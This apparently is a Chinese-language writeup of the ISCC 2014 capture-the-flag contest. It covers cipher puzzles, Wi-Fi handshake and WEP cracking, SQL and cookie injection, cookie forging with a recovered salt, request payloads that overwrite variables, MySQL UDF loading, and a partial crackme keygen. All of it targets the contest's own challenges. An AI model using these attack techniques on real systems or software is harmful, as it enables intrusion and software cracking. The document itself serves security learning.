@@ -1,0 +1,350 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">ISCC2014 writeup</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">F1uYu4n</a> <span class="bull">·</span> <time title="2014/06/17 20:27" ui-time="" datetime="2014/06/17 20:27" class="published ng-binding ng-isolate-scope">2014/06/17 20:27</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>算上今年4月份的360 Hackergame通关战，这是我第二次参加CTF比赛，现将比赛过程的一些思路和想法记录下来，同时也感谢诸多大神的指教。</p><h1>0x01 Basic孙子教学</h1><hr><h2>兵者诡道</h2><hr><p>第一关没啥好说的，F12一下，在response header里能找到Key</p><p><img alt="enter image description here" img-src="3172527903013fa398b5a9d4e68c5da6e7263d66.jpg"></p><p>Flag：<code>Welcome-to-ISCC</code></p><h2>知己知彼</h2><hr><p><img alt="enter image description here" img-src="3c399e69872adeba299725e0b0c6afb57ff92396.jpg"></p><p>45对应ASCII“-”，42对应“*”，变成了<code>-- *-- --* --* * *-* *--</code>，恰好是Morse密码，解密得到mwggerw，Caesar解密一下得到isccans，即Flag。开始一直没想到Caesar，直到看到两个g连在一起，比赛的名字又有两个c，才联想到的。</p><p>Flag：isccans。</p><h2>正则指令</h2><hr><p><img alt="enter image description here" img-src="3ebadf6b5f2c7e26e342ab7b46fa8a4bc9a39a9b.jpg"></p><p>w{3}=www，目测是个网址，然后[xyz]表示一个xyz之一起始的域名，做这题的时候我恰好翻过墙，然后看到后面的watch和list想到了是youtube.com，翻墙进入页面：www.youtube.com/watch?v=5x1vNTjbwcs&amp;list=PL3ZQ5CpNulQm1cXMJ5M6tX3O5vyXnCYFd，视频标题即Flag。</p><p><img alt="enter image description here" img-src="28fe65df4dc189b5575090ea19b37017225ac36e.jpg"></p><p>Flag：<code>Chile hit by an 8.2 magnitude earthquake</code></p><h2>搜索情报</h2><hr><p><img alt="enter image description here" img-src="57edc70fcec8a894e05e1e615828b6cf9ca60ad7.jpg"></p><p>这题坑死了，开始一直以为是HEASLR，怎么输都不对……，后来经人提醒看图标才发现 这个logo，这个PE工具我电脑里有却一直没想到。 Flag：<code>CFF Explorer</code></p><h2>指令暗战</h2><hr><pre><code>MOV AX,CS
+MOV DS,AX
+MOV ES,AX
+MOV CX,0020H
+MOV DX,1004H
+MOV BX,000CH
+MOV AX,2300H
+</code></pre><p>使用汇编转换成机器码的软件：AsmToHex</p><p><img alt="enter image description here" img-src="096d2a4a263b4b2cb50248449464c3342531abb8.jpg"></p><p>Flag：<code>8CC88ED88EC0B92000BA0410BB0C00B80023</code></p><h2>巧入敌营</h2><hr><p>F12打开，将表单提交方式由get改成post，然后输入任意值提交即可。</p><p><img alt="enter image description here" img-src="2e190e4de98eb7422462515ea305e948045e8921.jpg"></p><p>Flag：<code>4qrPccxPe9</code></p><h2>知兵之将</h2><hr><p>下载附件，得到password.out，用WinHex打开，文件头为7F 45 4C 46，用这个网站：http://www.garykessler.net/library/file_sigs.html查到是一个Linux下的可执行文件。</p><p><img alt="enter image description here" img-src="0094243dfca8a0bef5ccaafaff84a5255608d1b5.jpg"></p><p>用IDA加载，文件中有一段很惹眼的字符串：</p><p><img alt="enter image description here" img-src="ac01cb79699017215493f8d06aaa134d77a1f0c7.jpg"></p><p>提交发现就是Flag。 Flag：<code>abc456_09876tiyouare</code></p><h2>虚实密文</h2><hr><p>下载附件，得到一张PNG图，用二进制打开，没发现什么端倪，看来Flag在图片内容里面。打开发现是两种字体一正一斜写成一句话：</p><p><img alt="enter image description here" img-src="1a498b2fb6c0937f418e3d1bfd81f25ebd1065e7.jpg"></p><p>开始想的是把正斜体分开来处理，未果。经人提醒是培根密码，又学到一招，之前不知道这个。将密文5个一分组，a代表正体，b代表斜体得到：</p><pre><code>aabab baaaa aabaa aabaa aaabb abbab ababb 
+</code></pre><p>查密码表得到freedom，用的是培根密码百度百科的第二种方式的密码表。</p><p><img alt="enter image description here" img-src="36fc5ac773fa5c9ff86cd241ee8f560a5e2b3410.jpg"></p><p>Flag：<code>freedom</code></p><h2>经之五事索其情</h2><hr><p>RSA算法加密，密文是981，w = 13，n = 2537，求明文P</p><p>题目中的“分解式的一个因子是43”完全没有必要告知。</p><p><code>n=2537=43*59=p*q，φ(n)=(p-1)*(q-1)=42*58=2436，e=w=13，C=981</code></p><p>需要找到d使得d*e=1(modφ(n))，用一个我写的小工具得到d=937</p><p><img alt="enter image description here" img-src="9096ac02470e06ae09b9632c5cdfa40af5a37da9.jpg"></p><p>于是明文P=C^d(mod n)，用python可以很快得出结果：</p><p><img alt="enter image description here" img-src="5d99fcc70b266a047e8e727796c9556b266c926b.jpg"></p><p>Flag：704</p><h2>趁虚而入</h2><hr><p>下载附件，得到handshake.cap，看来是需要通过握手包来跑出密码。使用EWSA(ELcomsoft Wireless Security Auditor)打开cap文件：</p><p><img alt="enter image description here" img-src="4ec183c6a1b117d215fcdf2c90956b15107bb968.jpg"></p><p>选上合适的字典，开始攻击，最后得到结果：</p><p><img alt="enter image description here" img-src="6362951503b821ee72a36cce0b264a4f4140d792.jpg"></p><p>Flag：<code>zzzzzzzz</code></p><h2>出其不意</h2><hr><p>要破WEP密码，首选aircrack-ng，这软件还有windows的GUI版，不过它只认.cap和.pcap格式的文件，需要将附件中的.pkt文件转换成.pcap格式。 开始选择wireshark进行转换，放到aircrack-ng里破解总是提示：</p><p><img alt="enter image description here" img-src="fc2bc2e65c56642f4f76e104412c1e6402c259ab.jpg"></p><p>看来wireshark不太给力，换成OmniPeek来转换，继续aircrack-ng，这下有结果了，aircrack-ng很快就搞定了：</p><p><img alt="enter image description here" img-src="287826bbbe661ac6dc5689cabb2601079497c3aa.jpg"></p><p>WEP的密钥的ASCII值为：<code>2014IscCwifiY</code> 然后用wireshark或OmniPeek打开.pkt或.pcap文件都行，输入WEP密钥解码数据包。 wireshark：</p><p><img alt="enter image description here" img-src="86754d1629538e6d9e45bac125b9a3114f3b7a49.jpg"></p><p>OmniPeek：</p><p><img alt="enter image description here" img-src="9557bf1c3e4e65fb7d052aacc140baaeeec238e9.jpg"></p><p>在第一个HTTP包里面就能找到登录密码：</p><p><img alt="enter image description here" img-src="fcdd79ef24dcbf49bcbf4d211ef6df8c119a8ea9.jpg"></p><p><img alt="enter image description here" img-src="0f98a4118bb205251be8c1278c3a902eabc31709.jpg"></p><p>Flag：<code>Thisiskey</code></p><h2>择人任势</h2><hr><p>这是一道陈题，SWPU2012的题，刚参赛的时候，很多题不得要领，于是翻了不少其他CTF的writeup，恰巧就看到了这题。以下是SWPU提供的解答： 用记事本打开，注意末尾的代码：</p><pre><code>:execute(replace(replace(strreverse(swpu), Chr(-23646), Chr(34)), "★", vbCrLf))
+</code></pre><p>显然execute后的括号里是在进行代码解密还原，我们现在需要明文代码，将末尾代码修改为：</p><pre><code>Set fso = CreateObject("scripting.FileSystemObject")
+Set myfile = fso.openTextFile("code.txt", 2, True)
+myfile.write(replace(replace(strreverse(swpu), Chr(-23646), Chr(34)), "★", vbCrLf))
+Set myfile = Nothing 
+Set fso = Nothing
+</code></pre><p>修改后保存，然后打开输出文件code.txt，分析代码，发现关键算法如下：</p><pre><code>if (len(str)=14) then
+for i=0 to 13
+if Int(asc(mid(str,14-i,1))+pwda(i))=Int(tbl(i+pwdb(i))) then
+x=x+1
+else
+msgbox err
+exit for
+end if
+next
+if x=14 then
+msgbox ok
+end if
+else
+msgbox err
+end if
+</code></pre><p>首先，输入的文本长度必须为14，接着就是每一位的验证：</p><pre><code>Int(asc(mid(str,14-i,1))+pwda(i))=Int(tbl(i+pwdb(i)))
+</code></pre><p>只有满足这个条件的字母，程序才会继续验证下一条，否则就报错，分析一下这句判断，pwda、pwdb、tbl都是常量数组，因此这里只需要进行反向计算即可。 将循环部分的代码改为如下代码：</p><pre><code>for i=0 to 13
+   key = chr(tbl(i+pwdb(i)) - pwda(i))&amp;key '验证是倒序的，所以这里也应该倒序
+next
+msgbox key
+</code></pre><p>再次运行这个VBS，即可得到本题的Flag。</p><p>Flag：vB5_5cR1pT.Vb$</p><h2>庙算多寡，胜负定矣</h2><hr><p>下载附件，打开是一个加密txt文本的程序。用IDA打开该程序，大致可以看到：</p><p><img alt="enter image description here" img-src="2f3ee9007e4f076b2b6614dd15809f181c35359d.jpg"></p><p>其中sub_401b00：</p><p><img alt="enter image description here" img-src="6b28182c51b31416aa6813c5a84341b0b75d2c16.jpg"></p><p>基本上可以确定是单码代换，我们可以自行构造合适的txt来测试加密过程：</p><p>首先取txt内容为：0123456789abcdefghijklmnopqrstuvwxyz。</p><p>得到对应的密文为：efghijklmn=========================z。</p><p>可以看出0-9依次加密为e-n，a-y的加密结果均为“=”，z加密不变。</p><p>再取txt内容为：ABCDEFGHIJKLMNOPQRSTUVWXYZ，</p><p>得到对应的密文为：vwxyz{|}~€亗儎厗噲墛媽崕?。</p><p>Winhex下查看即知，密文的ASCII码恰为0x76，0x77，…，0x8F，得到ABCDE依次加密为vwxyz。</p><p>最后取txt内容为 !"#$%&amp;'()*+,-./</p><p>得到对应的密文为!#%')+-/135,.0</p><p>由此我们知道已知密文“+%=keky+%=jjnx”中：</p><pre><code>“+”→“&amp;”  “%”→“#”
+“k”→“6”  “e”→“0”
+“y”→“D”  “j”→“5”
+“n”→“9”  “x”→“C”
+</code></pre><p>最后还有一项“=”，但是a-y的加密结果均为“=”，由&amp;#我们知道这是Unicode编码方式，“=”应该由16进制标识符x加密而来，从而明文是&amp;#x606D&amp;#x559C，对应的中文汉字就是“恭喜”。</p><p>Flag：<code>&amp;#x606D&amp;#x559C</code></p><h1>0x02 Web桓公霸业</h1><hr><h2>国君之争</h2><hr><p>下载附件，得到crackBynet，用WinHex打开，文件头为7F 45 4C 46，依然是Lunix可执行文件，IDA加载之，翻了一阵有个echo(void)的函数很可疑：</p><p><img alt="enter image description here" img-src="40b4b561b9a0ade9d6c880da6d7e647cb219b2be.jpg"></p><p>有个the password is：心中窃喜，开始一直以为Flag就是那三个字符串的组合，无奈怎么尝试都不正确，还是决定分析函数看运行结果。</p><pre><code>std__string__string(&amp;v15, "sdfaer34dfv234523aae3fas", &amp;v14);
+</code></pre><p>即v15="sdfaer34dfv234523aae3fas".</p><pre><code>v1 = std__string__at(&amp;v15, 10);         v1=v15[10]=’v’，然后cout&lt;&lt;v1;
+v2 = std__string__at(&amp;v15, 0);          v2=v15[0]=’s’，然后cout&lt;&lt;v2;
+v3 = std__string__length(&amp;v15);        v3=length(v15)=24，然后cout&lt;&lt;v3;
+v4 = std__string__at(&amp;v15, 1);          v4=v15[1]=’d’，然后cout&lt;&lt;v4;
+v5 = std__string__at(&amp;v15, 4);          v5=v15[4]=’e’，然后cout&lt;&lt;v5;
+std__string__append(&amp;v15, "sdfsad");    v5="sdfaer34dfv234523aae3fassdfsad"
+v6 = std__string__at(&amp;v15, 8);          v6=v15[8]=’d’，然后cout&lt;&lt;v6;
+v7 = std__string__at(&amp;v15, 21);         v7=v15[21]=’f’，然后cout&lt;&lt;v7;
+v8 = std__string__at(&amp;v15, 8);         v8=v15[8]=’d’，然后cout&lt;&lt;v8;
+std__string__append(&amp;v15, "wrwnxcisd"); 
+v15="sdfaer34dfv234523aae3fassdfsadwrwnxcisd"
+v9 = std__string__at(&amp;v15, 16);        v9=v15[16]=’3’，然后cout&lt;&lt;v9;
+v10 = std__string__at(&amp;v15, 13);       v10=v15[13]=’4’，然后cout&lt;&lt;v10;
+v11 = std__string__at(&amp;v15, 12);       v11=v15[12]=’3’，然后cout&lt;&lt;v11;
+v12 = std__string__at(&amp;v15, 19);       v12=v15[19]=’e’，然后cout&lt;&lt;v12;
+</code></pre><p>一共输出了vs24dedfd343e，提交即Flag。</p><p>Flag：<code>vs24dedfd343e</code></p><h2>霸业蓝图</h2><hr><p>根据题目要找的是exif漏洞，搜索exif漏洞：</p><p><img alt="enter image description here" img-src="f2e3f309db339cc39701106055dd196567558021.jpg"></p><p>应该在上传的图片的exif信息里嵌入xss代码。</p><p><img alt="enter image description here" img-src="881eb8d7bbde63f317f73139a17c362ad02bdec0.jpg"></p><p><img alt="enter image description here" img-src="78049bcd52213d4ea8d766a4a6ec0c4aad011764.jpg"></p><p>Flag：19ojep03</p><h2>君臣论证</h2><hr><p>BurpSuite截下包发现是通过multipart/form-data方式传递表单：</p><p><img alt="enter image description here" img-src="91e9bdbbe646be29f4c8f7d5ccab1fd02734a0b9.jpg"></p><p>改成一般的表单(post)传递参数，页面正常显示。</p><pre><code>balance=4&amp;year=2012&amp;month=1&amp;submit=Let%27s+Go+%21
+</code></pre><p>多次尝试发现balance=2时，©处总是显示2013，比较稳定。 故决定固定balance=2进行注入。</p><p><img alt="enter image description here" img-src="0d8a04ec30cf4260b9cb94ba5fe0df92d846e18d.jpg"></p><p><img alt="enter image description here" img-src="67039f8f5f6454adcb4738276e02194803aafb21.jpg"></p><p><img alt="enter image description here" img-src="ca7565bb55f0bf7400861e03e1a2fad8abeb9926.jpg"></p><p>根据题目提示，秘密在xiaoming这张表中。</p><p><img alt="enter image description here" img-src="e6e8f8aba24b29cd1ffdbe50bf050c465d3243b8.jpg"></p><p>Flag：<code>9xme0siv2</code></p><h2>火眼金睛</h2><hr><p>http://script.iscc.org.cn/web01&#95;853d9ed229ab47b5878c456d2d861dad/index.html 页面提示有两个用户，Admin和VeryCD永垂不朽，看来是要通过一般用户VeryCD永垂不朽来获取管理员Admin的密码。 http://script.iscc.org.cn/web01&#95;853d9ed229ab47b5878c456d2d861dad/login.html下有个登录框，需要的是邮箱和密码而不是用户名。</p><p><img alt="enter image description here" img-src="0947e6531b3e32700abc727419990c6328cc35e4.jpg"></p><p>将VeryCD永垂不朽放到社工库搜索得到：</p><p><img alt="enter image description here" img-src="7f8383a8677296a507da40b8b2e1bcb2ff2853da.jpg"></p><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dc3861633b4874355e723b726dafa8bdb2b0b9a5f2b6b5bdb2bb9cbdacf2b6b0b0394e5039735a3b7c5dbbb2b5b7b2b5">[email&#160;protected]</a>[512312成功登录。</p><p><img alt="enter image description here" img-src="1b02dbe59938d91ea7583d6429abcd30f4ba7254.jpg"></p><p>下载图片用Winhex打开，在文件末段可以看到部分代码。</p><p><img alt="enter image description here" img-src="c85ea3fbc8f335a6aa337a71693aaeb6f0e162b2.jpg"></p><p>从代码可以得知，hsh=md5(salt+strrev(auth))，其中salt是8位的，直接搜索代码：</p><p><img alt="enter image description here" img-src="e5630b450c85793e9366becf405b78612541e011.jpg"></p><p>点进去发现原来是PlaidCTF2014的writeup，内容和火眼金睛极为相似，差别是一个md5，一个是sha256。</p><p><img alt="enter image description here" img-src="f5d960fb5ee4881aae14e0c1987b435a7e86d9b9.jpg"></p><p>同时得到提示，有个admin.php的页面，打开</p><p><img alt="enter image description here" img-src="41c61a9ab4d0a3d624037136c2a9c1275d46f8fb.jpg"></p><p>提示未授权。打开cookie：</p><p><img alt="enter image description here" img-src="649943df615e2bcf74185e9b3a8b21909318f904.jpg"></p><p>通过hsh=md5(salt+strrev(auth))，看已有的hsh和auth能否得出salt。</p><p><img alt="enter image description here" img-src="a55458dbf689ff3ba92f676b0231df46eccbed00.jpg"></p><p>从而salt=iamadmin。</p><p><img alt="enter image description here" img-src="b73da29f7ee5261103aeda58eff6a1a1055655a4.jpg"></p><p>和这里类似：将auth=b:0;修改为b:1;，重新计算<code>hash=md5(iamadmin;1:b)= 4221c14a2bc59a3c2998a531ff7cb929</code>。将cookie的auth和hsh修改成这两个值：</p><p><img alt="enter image description here" img-src="8b72f2bd0cc4f583d22423fc3756c0910ca178d5.jpg"></p><p>刷新页面变成了：</p><p>下面就是post注入的时间了：</p><p><img alt="enter image description here" img-src="2bad68b809086cad13d622a7535bd91c0eae4b7c.jpg"></p><p><img alt="enter image description here" img-src="d31bd3e7958b5921455e2cdcb86b6f2d5c58a64a.jpg"></p><p><img alt="enter image description here" img-src="5b2890a361ee13132bc5665430ea535c534b148d.jpg"></p><p><img alt="enter image description here" img-src="461.png"></p><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dc3861633b48743b727d3b4c5a394d44355e723b726dbdb8b1b5b2b5afa8aebda8b3ae9ca8b5bdb2a5bdf2bfb3b1394e5039735a3b7c5deee8eaed9fe4ef9fe4ece5">[email&#160;protected]</a>E8BA6登录网页：</p><p><img alt="enter image description here" img-src="0b7d2bb42b64b28443c550174ec9323ce6387550.jpg"></p><p>下载图片，Winhex打开，文件中部发现：</p><p><img alt="enter image description here" img-src="7046fddd818fe0d684c389d7f81394a4e6a825c3.jpg"></p><p>Flag：<code>I_AM_A_VERY_SMART_ADMIN_LOL</code></p><h2>上古神兽</h2><hr><p>转让2048MB(≤2GB)，页面提示“生日礼物就给我这么点流量么？怎么也得100GB吧。嘻嘻”。转让2049MB，页面提示“你那有那么多流量啊？”。看来阀值是2048。大致代码应该是if(uploaded/1024&lt;=2)…else…。</p><p>经过管理员提醒知道考察点是变量覆盖后，大家就开始猜测变量名是什么。已有2G，要求转100G，我开始的想法就是覆盖2G的变量，将2G修改为1000G，这样再转让流量就能通过。接着就开始了我噩梦般的爆破过程，首先根据其他2个变量名uploaded和receiver猜测应该是一个单词，我拿了一个20M的来自于Facebook的words字典，天天跑，当然单字母变量这种也早就试过，post跑完跑get，get跑完跑cookie，总之没有结果。所用Payload如下：</p><pre><code>uploaded=204800&amp;receiver=lubao515&amp;submitbutton=%E6%8F%90+%E4%BA%A4&amp;§a§=1000
+</code></pre><p>跑了几天，有大神已搞定，我才变换思路去覆盖100G对应的变量，将100G变小到小于已有的2G也能转让成功。所用Payload如下：</p><pre><code>uploaded=123&amp;receiver=lubao515&amp;submitbutton=%E6%8F%90+%E4%BA%A4&amp;§a§=1
+</code></pre><p><img alt="enter image description here" img-src="81f61ca5a2a2d7a9beea3ec0d4bf240171e04b09.jpg"></p><p>G对应的response信息为：感谢你的礼物，我现在已经有999999999MB的流量了！ 至此得到G是要覆盖的变量名，且要求G&lt;2。 下面开始注入的过程：</p><p><img alt="enter image description here" img-src="18bd6d08a073e2f34e44ff244ab5134b6454d754.jpg"></p><p><img alt="enter image description here" img-src="4ce7c18ab733d1425f4d8f93bbc13df0d0fa3359.jpg"></p><p><img alt="enter image description here" img-src="3020e30bc11bdc8b654f248d900e12f81d1cfbf1.jpg"></p><p>Flag：<code>8froerf9pu34rjeslfh</code></p><h2>老马识途</h2><hr><p>SWPU2012的陈题，以下是SWPU提供的解答。 进入题目页面，提示“密码已经通过某种方式发给你了哦！不过密码的有效期只有3秒，要快哦！”（居然连提示内容都一样） HTTP response头里可以看到要提交的PassWord。</p><p><img alt="enter image description here" img-src="f212d6cdf4e523711fdb60cd9a814e1eea7923d3.jpg"></p><p>再根据题目信息，需要将这个密码先MD5加密再提交，但这里只有3秒的有效时间，很明显这里只有通过编程才能完成了。 参考代码（Visual C#）：</p><pre><code>using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Web;
+using System.Net;
+using System.Security;
+using System.Security.Cryptography;
+using System.Text;
+
+namespace Client1
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            CookieContainer cookieContainer = new CookieContainer();
+            //获取头信息中的密码
+            string URI = "http://script2.iscc.org.cn/web07_e3a95260b7271954aa59460c134cde7e/";
+            HttpWebRequest request = WebRequest.Create(URI) as HttpWebRequest;
+            request.CookieContainer = cookieContainer;
+            request.Method = "GET";
+            request.KeepAlive = false;
+            HttpWebResponse response = request.GetResponse() as HttpWebResponse;
+            string pwd = response.Headers["PassWord"];
+            //MD5加密
+            MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
+            string MD5Pwd = BitConverter.ToString(md5.ComputeHash(UTF8Encoding.Default.GetBytes(pwd)));
+            MD5Pwd = MD5Pwd.Replace("-", "");
+            Console.WriteLine("PassWord: {0}\r\nMD5: {1}\r\n", pwd, MD5Pwd);
+            //提交结果
+            string formatString = "pwd={0}";
+            string postString = string.Format(formatString, MD5Pwd);
+            byte[] postData = Encoding.ASCII.GetBytes(postString);
+
+            URI = "http://script2.iscc.org.cn/web07_e3a95260b7271954aa59460c134cde7e/?action=Check";
+            request = WebRequest.Create(URI) as HttpWebRequest;
+            request.CookieContainer = cookieContainer;
+            request.Method = "POST";
+            request.KeepAlive = true;
+            request.UserAgent = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)";
+            request.ContentType = "application/x-www-form-urlencoded";
+            request.CookieContainer = cookieContainer;
+            request.ContentLength = postData.Length;
+            request.ServicePoint.Expect100Continue = false;
+            System.IO.Stream outputStream = request.GetRequestStream();
+            outputStream.Write(postData, 0, postData.Length);
+            outputStream.Close();
+            // 接收返回的页面
+            response = request.GetResponse() as HttpWebResponse;
+            System.IO.Stream responseStream = response.GetResponseStream();
+            System.IO.StreamReader reader = new System.IO.StreamReader(responseStream, Encoding.GetEncoding("UTF-8"));
+            string srcString = reader.ReadToEnd();
+            Console.WriteLine("{0}", srcString);
+            Console.ReadKey();
+        }
+    }
+}
+</code></pre><p>执行程序，得到：</p><p><img alt="enter image description here" img-src="9c6979afbfc1a90d299e062c6ac50bb1737d2e1e.jpg"></p><p>Flag：<code>W3b_Pr0Gr4m1ng@_@</code></p><h2>首次会盟</h2><hr><p>SWPU2012的陈题，以下是SWPU提供的解答。 下载题目文件，由于是dll文件，很明显只能在NT环境下使用，在windows 上搭建一个mysql环境，将udf.dll放置到mysql安装目录中的bin文件夹中，然后以root权限登录mysql，执行下面这样一条语句：</p><pre><code>create function about returns string soname 'udf.dll'
+</code></pre><p>然后再执行：</p><pre><code>select about()
+</code></pre><p>返回的结果如下：</p><pre><code>Use getkey function to get the key!
+</code></pre><p>很明显，getkey是最终我们需要的函数名，再次添加函数：</p><pre><code>create function getkey returns string soname 'udf.dll'
+</code></pre><p>然后再执行：</p><pre><code>select getkey()
+</code></pre><p>即可得到本题的KEY。</p><p>Flag：<code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e2b7bdb58b8e8ebdb79187bdb78684bdab8cbda48b8c838ebda18a838e8e878c8587a2d0d2d3d0">[email&#160;protected]</a></code></p><h2>霸业初成</h2><hr><p>URL中/show.asp?id=1，基本上确定是SQL注入没跑了。构造语句尝试注入： /show.asp?id=1 and 1=1，结果出现了防注入提示：</p><p><img alt="enter image description here" img-src="eac8612d22cd24256d6beaa3371bf518669795a0.jpg"></p><p>很明显，这里考察的是绕过防注入。尝试大小写变换等，结果都无效。考虑其他的传参方式，COOKIES传参通常是漏洞发生的地方，首先删除url中的id=1，利用Firefox插件Firebug添加cookies：id:1 and 1=1</p><p><img alt="enter image description here" img-src="5c19076f4a5fbc53499311faa269a2ed8f858703.jpg"></p><p>刷新页面，发现能返回正常内容，很明显，这里可以cookies注入。上sqlmap：</p><p><img alt="enter image description here" img-src="8749e632c079de3eef5174652e6317c629f8e8ef.jpg"></p><p><img alt="enter image description here" img-src="75c2c37c833d657e7ca4cb2fdcfc4582e213bf55.jpg"></p><p>因网站问题，无法复现。</p><p>Flag：CaiBuDaoDeMiMa</p><h1>0x03 Reverse文公传奇</h1><hr><h2>找到杀手</h2><hr><p>解压附件得到一个exe和一个txt，exe需要输入密码，PEid查下发现是.net程序。</p><p><img alt="enter image description here" img-src="f969711695dac421b44b319350ee333c583ba178.jpg"></p><p>txt中的的字符串经过base64解码，和Unidcode解码</p><p><img alt="enter image description here" img-src="de07420dbcf839264a73326afba711aab8205ac4.jpg"></p><p>得到一串中文：</p><p><img alt="enter image description here" img-src="595dcdfa30d3648a09036d204c2f52ad5d0c86dc.jpg"></p><p>完全看不出有什么用，还是从exe入手吧。 .Net Reflector加载GetThePictures.exe，可以看到加密方式是AES。</p><p><img alt="enter image description here" img-src="5bc2cd7638a71afafddda1df9d6e1521bf428787.jpg"></p><p>其中CheckKey()中可以看到加密得到的密文</p><p><img alt="enter image description here" img-src="6446f42189153ffbaefc8ae7e84ddfb17dcc93a6.jpg"></p><p>输入DI0PFY8TP9x61YTtUkmqYQ==，得到4张图片fangkuaiK.png，meihuaK.gif，hongtaoK1.jpg，heitaoK.bmp：每张图上有一句英文，分别是</p><p><img alt="enter image description here" img-src="d609c38f2f3acb0982ecf7a90f597acbb111d0ec.jpg"></p><pre><code>fangkuaiK.png：enjpy yourself here
+meihuaK.gif：  good luck to you
+hongtaoK1.jpg：welcome to iscc
+heitaoK.bmp：  God bless you
+</code></pre><p>挨个尝试得到Flag。</p><p>Flag：<code>God bless you</code></p><h2>避难母国</h2><hr><p>题目要求每次都听Andy的，那就把Bob和Carl的名字都改成Andy。</p><p><img alt="enter image description here" img-src="e9b6da4813516c08b3c4efe91a9b1a7a9eb4bba1.jpg"></p><p>↓</p><p><img alt="enter image description here" img-src="e9546b18df7a1c8459ad1f412efc1ae02a6f87b0.jpg"></p><p>再次运行程序，得到</p><p><img alt="enter image description here" img-src="02fd8ead7a8b19d61241e971cd2e2591ae39b97b.jpg"></p><p>Flag：<code>FireInTheHole</code></p><h2>流亡齐国</h2><hr><p>SWPU2012的陈题，以下是SWPU提供的解答。 用Reflector反编译，找到Button1_click事件代码如下：</p><p><img alt="enter image description here" img-src="6a59dc69031c4e14ae96676e1804396bb3af1d14.jpg"></p><p>分析代码，这里调用了函数Encrypt对输入的内容进行处理，如果返回的等于"<code>sXeC6p/mrl93Jyq3F79+Jg==</code>"则弹出成功提示。继续分析Encrypt函数代码：</p><p><img alt="enter image description here" img-src="39d56fb15e0ae9544974b631d5817592ad140429.jpg"></p><p>通过Rijndael可以看出这里是用了 AES加密算法，AES算法是对称加密算法，密钥这里就是"<code>swpu2012swpu2012swpu2012swpu2012</code>"，现在要做的就是编写个C#程序用同样的算法把密文还原即可。 参考代码（C#）：</p><pre><code>using System;
+using System.Collections.Generic;
+using System.Security.Cryptography;
+using System.Text;
+
+namespace decrypt
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            byte[] key = UTF8Encoding.UTF8.GetBytes("swpu2012swpu2012swpu2012swpu2012");
+            byte[] data = Convert.FromBase64String("sXeC6p/mrl93Jyq3F79+Jg==");
+            RijndaelManaged managed = new RijndaelManaged();
+            managed.Key = key;
+            managed.Mode = CipherMode.ECB;
+            managed.Padding = PaddingMode.PKCS7;
+            ICryptoTransform cTransform = managed.CreateDecryptor();
+            string result = UTF8Encoding.UTF8.GetString(cTransform.TransformFinalBlock(data, 0, data.Length));
+            Console.WriteLine("{0}", result);
+            Console.ReadKey();
+        }
+    }
+}
+</code></pre><p>Flag：<code>Ae5_3nCrYpT1on</code></p><h2>宗女齐姜</h2><hr><p>下载附件，用IDA加载，注意到sub_401000函数：</p><p><img alt="enter image description here" img-src="a54cb7b8c201fb2351dface2da098116b60da824.jpg"></p><p>这里伪代码很明显，要求输入的字符串是hellow，重新运行程序输入hellow，得到Flag。</p><p><img alt="enter image description here" img-src="f159eca5570142fb4d148dbca355acd88d571fa9.jpg"></p><p>Flag：Eaglewatch</p><h2>逃离临淄</h2><hr><p>经过OD和IDA Pro的分析，大致得出注册码至少31位，多于31位的部分对注册过程没任何影响第1位由注册名第1位而来，第7位和第14位必须为”-”，第15到20位表示到期时间，前21位的其他位置可以任意。第22-31位由前21位唯一决定。</p><p><img alt="enter image description here" img-src="9f54096122627d8e7a549bfd6e57cd56f59d7a95.jpg"></p><p><img alt="enter image description here" img-src="8ac000d4eadabdfcae0b414f93f753822b337168.jpg"></p><p><img alt="enter image description here" img-src="979f66a8555787bdd0e85e5f1da80869d2bb1c7d.jpg"></p><p>IDA可以看到主要2个函数的伪代码：</p><p><img alt="enter image description here" img-src="bdb0efad70c949ea38e7626718652dd210331d82.jpg"></p><p><img alt="enter image description here" img-src="6d8ec6f6ab33cbd99d916e1ed2669df0c3c15b87.jpg"></p><p>前21位经过sub&#95;4016C0()运算后再加上一个常量字符串和注册码经过sub&#95;401750()运算后得到一个8位16进制数，该数与atoi(sub_4016C0(第22-32位))作比较后，相等则注册成功，否则注册失败。 注册机参考代码（C#）：</p><pre><code>using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Text;
+using System.Windows.Forms;
+
+namespace CrackMeKeygen
+{
+    public partial class Form1 : Form
+    {
+        private static string constStr = "9b66fd67e34de9d6c52cfcc824f3c84a2f89b30192c232ccaf299273836b88a5";  // 字符串常量
+
+        public Form1()
+        {
+            InitializeComponent();
+            this.dtpDate.MaxDate = new System.DateTime(2099, 12, 31, 0, 0, 0, 0);
+            this.dtpDate.MinDate = new System.DateTime(2000, 1, 1, 0, 0, 0, 0);
+            this.dtpDate.Value = new System.DateTime(2014, 8, 1, 0, 0, 0, 0);
+            this.txtUsername.Text = "iscc";
+        }
+
+        private void btnCrack_Click(object sender, EventArgs e)
+        {
+            string username = txtUsername.Text;  // 注册名
+            if (username.Trim() == "")
+            {
+                MessageBox.Show("用户名不能为空!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+
+            string date = this.dtpDate.Value.ToString("yyMMdd");  // 到期日期，格式为140801
+
+            UInt32 eax;  //  判断注册成功与否关键步骤的EAX寄存器的值
+            do
+            {
+                Random rd = new Random();  //  随机产生注册码第2-6和8-13位
+                //  第一部分为第1-21位
+                string regeditCode1_21 = encode(username[0].ToString())     //  第1位
+                    + Convert.ToString(rd.Next(0x10000, 0xfffff), 16) + "-"     //  第2-6位，第7位为"-"
